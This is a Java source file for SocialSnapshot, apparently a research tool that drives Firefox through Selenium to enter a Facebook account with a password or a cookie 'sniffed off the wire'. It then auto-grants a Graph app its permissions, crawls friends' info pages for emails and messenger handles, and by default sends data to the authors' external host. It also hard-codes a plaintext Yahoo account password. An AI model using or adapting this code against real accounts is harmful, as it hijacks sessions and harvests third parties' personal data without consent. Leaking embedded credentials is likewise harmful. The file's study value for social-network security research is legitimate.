package at.mannaz.socialsnapshot;

import java.io.BufferedWriter;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileWriter;
import java.io.IOException;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Date;
import java.util.List;
import org.openqa.selenium.NoSuchElementException;
import java.util.Properties;
import java.util.Set;

import org.openqa.selenium.By;
import org.openqa.selenium.Cookie;
import org.openqa.selenium.WebDriver;
import org.openqa.selenium.WebElement;
import org.openqa.selenium.firefox.FirefoxDriver;

import com.thoughtworks.selenium.Selenium;

/**
 * A Facebook crawler class, utilising Selenium. The basic procedure it uses is as follows: 1. Log into Facebook, either
 * by using login credentials (mail and password) or a cookie you sniffed off the ether. 2. Open a window with our Graph
 * Crawler, grant permissions automatically, wait a few seconds, then switch back from that window 3. Open the friends
 * list 4. Iterate through all friends, open their "info" page and print all fields there that contain an '@' character
 * to stdout 5. Remove our Graph app from the list of installed applications.
 * 
 * You need to start a Selenium server on the default port before launching this application.
 * 
 * @author mleithner@sba-research.org
 * 
 */
public class SocialSnapshot {
	/**
	 * Indicates whether we're coming from a login page or just jumped right into the session with a session cookie.
	 */
	static boolean fromLogin = false;

	/*
	 * The application id for log-out ccs,div will be set by your config file
	 */
	// XXX: If you are not sure where to find the
	// appropriate value, simply grant your app access to your account, then
	// examine the corresponding link to remove your app from the Facebook
	// "Applications" settings.
	static String appid = "";

	static String yahooUser = "socialsnapshottool@yahoo.com";

	static String yahooPassword = "qrO[k7iOg";

	// The path to your FB application, i.e. where you installed SocialSnapshot to.
	// XXX: You definitely do want to change this. Unless you feel like pushing
	// your data over to us...in which case you give SBA Research consent to use it for
	// anonymised research purposes.
	static String graphHost = "http://socialsnapshot.mannaz.at/php/";

	// Host and Port of the selenium server instance the client connects to
	static String serverHost = "localhost";
	static int serverPort = 4444;

	/*
	 * Timeout for application removal
	 */
	static Date appExeTimeout;
	// Time in minutes
	// static Integer apptimeout = 30;
	// No timeout for now
	static Integer apptimeout = 0;

	/**
	 * A number of cookie names that should be set in order to be able to access Facebook via Header Injection.
	 */
	static ArrayList<String> cookieNames = new ArrayList<String>();
	static {
		SocialSnapshot.cookieNames.add("locale");
		SocialSnapshot.cookieNames.add("datr");
		SocialSnapshot.cookieNames.add("lu");
		SocialSnapshot.cookieNames.add("sct");
		SocialSnapshot.cookieNames.add("x-referer");
		SocialSnapshot.cookieNames.add("lsd");
		SocialSnapshot.cookieNames.add("c_user");
		SocialSnapshot.cookieNames.add("cur_max_lag");
		SocialSnapshot.cookieNames.add("sid");
		SocialSnapshot.cookieNames.add("xs");
		SocialSnapshot.cookieNames.add("e");
		SocialSnapshot.cookieNames.add("openid_p");
		SocialSnapshot.cookieNames.add("s");
		SocialSnapshot.cookieNames.add("p");
		SocialSnapshot.cookieNames.add("csm");
		SocialSnapshot.cookieNames.add("presence");
		// SocialSnapshot.cookieNames.add("wd");
	};

	/**
	 * Displays the given error message and terminates the program. Ugly hack.
	 * 
	 * @param msg Error message
	 */
	public static void fail(String msg) {
		System.err.println(msg);
		System.exit(-1);
	}

	/**
	 * Main method; please see the class description for a rough overview of what it does, and the inline documentation
	 * for details.
	 * 
	 * @param args Either a cookie (you will need to include the HTTPOnly cookies, too; document.cookie will NOT do it)
	 *            or two parameters, the first being the mail address, the second should be the password.
	 */
	public static void main(String[] args) {

		String mail, password, cookie;
		ArrayList<String> friendUrls = null, friendNames = null;
		mail = password = cookie = null;

		Properties config = new Properties();

		try {
			// Load the SocialSnapshot config file
			config.load(new FileInputStream("socialsnapshot.config"));

			// Parse the config options
			graphHost = config.getProperty("graphHost");
			appid = config.getProperty("appid");
			// Optional settings to override default selenium server settings.
			if (config.containsKey("serverHost")) {
				serverHost = config.getProperty("serverHost");
			}
			if (config.containsKey("serverPort")) {
				serverPort = Integer.parseInt(config.getProperty("serverPort"));
			}

		} catch (IOException ex) {
			System.out.println("SocialSnapshot configuration file not found or malformed (\'socialsnapshot.config\').");
			// ex.printStackTrace();
			System.exit(0);
		}

		/**
		 * Handling command line parameters. If we get two of them, assume we're doing password authentication (args[0]
		 * should be the mail address, args[1] the password). Otherwise, if there are command line parameters, we're
		 * using the first one as a cookie. If there are no command line parameters, hard-coded login credentials might
		 * be used. They might not be available in your build (for obvious security reasons).
		 */
		if (args.length == 2) {
			System.out.println("DEBUG: Using password auth.");
			mail = args[0];
			password = args[1];
			/*
			 * System.out.println("DEBUG: User credentials: " + mail + "/" + password);
			 */
		} else if (args.length > 0) {
			System.out.println("DEBUG: Using cookie auth.");
			StringBuilder cookieBuilder = new StringBuilder(args[0]);
			for (int i = 1; i < args.length; i++) {
				cookieBuilder.append(args[i]);
			}
			cookie = cookieBuilder.toString();
			System.out.println("DEBUG: Cookie: " + cookie);
			// System.out
			// .println("WARNING: Due to a bug in the Selenium RC server, this cookie will be stored until you shut the server down. PLEASE TAKE NOTICE. Password auth will not work anymore in this Selenium RC instance.");
		} else {
			System.out
					.println("__________SocialSnapshot__________\n"
							+ "Usage:\n"
							+ "java -jar socialsnapshot.jar <cookie>\n"
							+ "java -jar socialsnapshot.jar <mail> <password>\n"
							+ "\n\nSocialSnapshot logs into a Facebook account (or simply uses a cookie you sniffed off the wire), grabs all mail adresses of this account's friends and crawls data using the Graph API.\n"
							+ "Please note that you'll have to start a Selenium server before using this tool.\n"
							+ "You can start a Selenium server by using java -jar selenium-server.jar.");
			System.exit(0);
		}

		WebDriver driver = new FirefoxDriver();

		printCookies(driver);

		// Selenium selenium = new WebDriverBackedSelenium(driver, "http://facebook.com");

		// Create the timestamp nonce
		String nonce = "snapshot" + new Date().getTime();

		// Open Facebook and wait until the page has loaded;
		driver.get("http://www.facebook.com/");
		printCookies(driver);

		// Set the cookie, if given.
		if (null != cookie) {
			// cookies are done in ...
			Date cookieDate = new Date(new Date().getTime() + (3600 * 24));
			// ADD ALL THE COOKIES
			for (String singleCookie : cookie.split(";")) {
				String name, value;
				Cookie nCookie;
				int equalsIndex = singleCookie.indexOf('=');
				name = singleCookie.substring(0, equalsIndex).trim();
				value = singleCookie.substring(equalsIndex + 1).trim();
				System.out.println("Checking cookie " + name);
				if (SocialSnapshot.cookieNames.contains(name)) {
					nCookie = new Cookie(name, value, ".facebook.com", "/", cookieDate);
					driver.manage().addCookie(nCookie);
					System.out.println("Set cookie " + name);
				}

			}
		}

		logAndPrint("First instance loaded, should now have cookies.", nonce);
		printCookies(driver);
		// reload page for cookie test
		driver.get("http://www.facebook.com/?ref=logo");
		logAndPrint("second page load", nonce);
		printCookies(driver);

		// Are we doing password auth? If so, call our function.
		if (mail != null && password != null)
			SocialSnapshot.login(driver, mail, password);

		// Open our Graph Crawler
		driver.get(SocialSnapshot.graphHost + "/?sendid=" + nonce);

		WebElement elem = driver.findElement(By.id("connectlink"));
		elem.click();

		try {
			// add the application
			elem = driver.findElement(By.name("grant_required_clicked"));
			elem.click();
		} catch (NoSuchElementException e) {
			// when the app was eventually partially added before
		}

		try {
			// accept app features
			elem = driver.findElement(By.name("grant_clicked"));
			elem.click();
		} catch (NoSuchElementException e) {
			// app was already confirmed before
		}

		// facebook now automatically redirects back to the application and the application starts to gather the data

		// Let Selenium crawl through the links to friend profiles our Graph API just produced
		friendUrls = SocialSnapshot.fetchFriendUrls(driver, "friend");
		friendNames = SocialSnapshot.fetchFriendNames(driver, "friend");

		// If we managed to fetch links to friend profiles
		if (friendUrls != null && friendUrls.size() > 0) {
			try {

				if ((new File("results")).mkdir()) {
					System.out.println("Directory for results created.");
				}

				// Create file for logs
				FileWriter fstream = new FileWriter("results/" + nonce + ".csv");
				BufferedWriter logfile = new BufferedWriter(fstream);

				// Iterate over them
				for (String link : friendUrls) {
					// Add the "v=info" suffix to the link; we want to view the friend's info page, not his/her wall
					String userid = link.split("=")[1];
					System.out.print(userid + ",");
					if (link.contains("?"))
						link += "&v=info";
					else
						link += "?v=info";

					driver.get(link);

					// Username from page title
					String name = driver.getTitle();

					String emails = "";
					String instant = "";
					String mailimgurls = "";
					String phones = "";
					// String result = "";
					// List of Instant Names from FB
					List<String> instantNames = Arrays.asList("AIM", "Google Talk", "Windows Live Messenger", "Skype",
							"Yahoo! Messenger", "Gadu-Gadu", "ICQ", "Yahoo Japan", "QQ", "NateOn", "Twitter", "Hyves",
							"Orkut", "Cyworld", "mixi", "QIP", "Rediff Bol", "Vkontakte");

					try {
						List<WebElement> elems = driver.findElements(By.id("pagelet_contact"));
						logAndPrint(name, nonce);
					} catch (NoSuchElementException e) {

					}
				}
			} catch (Exception e) {
				logAndPrint("exception " + e.getMessage(), nonce);
			}
		} else
			logAndPrint("We got no friends ... forever alone :(", nonce);
	}

	private static void printCookies(WebDriver driver) {
		System.out.println("-------\nCookies for current Site (" + driver.getCurrentUrl() + "):");
		// output all the available cookies for the current URL
		Set<Cookie> allCookies = driver.manage().getCookies();
		for (Cookie loadedCookie : allCookies) {
			System.out.println(String.format("Cookie: %s -> %s", loadedCookie.getName(), loadedCookie.getValue()));
		}
		System.out.println("-------");
	}

	/**
	 * Waits for an element to appear in the DOM for 30 seconds.
	 * 
	 * @param selenium A Selenium instance to use for polling.
	 * @param selector A Selenium selector to poll for.
	 * @return true if the element appeared; false if it didn't exist after the timeout or an exception occurred.
	 */
	@SuppressWarnings("unused")
	private static boolean waitForElement(Selenium selenium, String selector) {
		return SocialSnapshot.waitForElement(selenium, selector, 30);
	}

	/**
	 * Waits for an element to appear in the DOM for a specified number of seconds.
	 * 
	 * @param selenium A Selenium instance to use for polling.
	 * @param selector A Selenium selector to poll for.
	 * @param seconds The number of seconds to wait for the element to become present.
	 * @return true if the element appeared; false if it didn't exist after the timeout or an exception occurred.
	 */
	private static boolean waitForElement(Selenium selenium, String selector, int seconds) {
		for (int second = 0;; second++) {
			if (second >= seconds)
				return false;
			try {
				if (selenium.isElementPresent(selector))
					return true;
			} catch (Exception e) {
				System.err.println("Error while polling for element: " + e.getMessage());
				return false;
			}
			try {
				Thread.sleep(1000);
			} catch (InterruptedException e) {
				e.printStackTrace();
				return false;
			}
		}
	}

	/**
	 * Handles the login procedure of Facebook. This is mostly separated from the main() method for better readability.
	 * <b>WARNING</b> For some reason, Selenium does not play well with long passwords, especially passwords that
	 * contain non-alphanumeric characters.c
	 * 
	 * @param selenium A Selenium WebDriver instance to operate on.
	 * @param mail The mail address used to log in.
	 * @param password The user's password.
	 */
	private static void login(WebDriver selenium, String mail, String password) {

		WebElement element = selenium.findElement(By.id("email"));
		element.sendKeys(mail);

		element = selenium.findElement(By.id("pass"));
		element.sendKeys(password);

		element.submit();

		if (selenium.getCurrentUrl().contains("facebook.com/checkpoint/")) {
			element = selenium.findElement(By.id("machine_name"));
			element.sendKeys("Computer");

			element = selenium.findElement(By.name("submit[Save Device]"));
			element.click();
		}

		SocialSnapshot.fromLogin = true;
	}

	private static ArrayList<String> fetchFriendUrls(WebDriver selenium, String className) {
		ArrayList<String> urls = new ArrayList<String>();
		List<WebElement> elems = selenium.findElements(By.className(className));
		for (WebElement elem : elems) {
			urls.add(elem.getAttribute("href"));
		}
		return urls;
	}

	private static ArrayList<String> fetchFriendNames(WebDriver selenium, String className) {
		ArrayList<String> names = new ArrayList<String>();
		List<WebElement> elems = selenium.findElements(By.className(className));
		for (WebElement elem : elems) {
			names.add(elem.getText());
		}
		return names;
	}

	private static void logAndPrint(String message, String nonce) {
		System.out.println(message);
		try {
			BufferedWriter out = new BufferedWriter(new FileWriter("results/" + nonce + ".log", true));
			out.write(message + "\n");
			out.close();
		} catch (IOException e) {
		}

	}

}
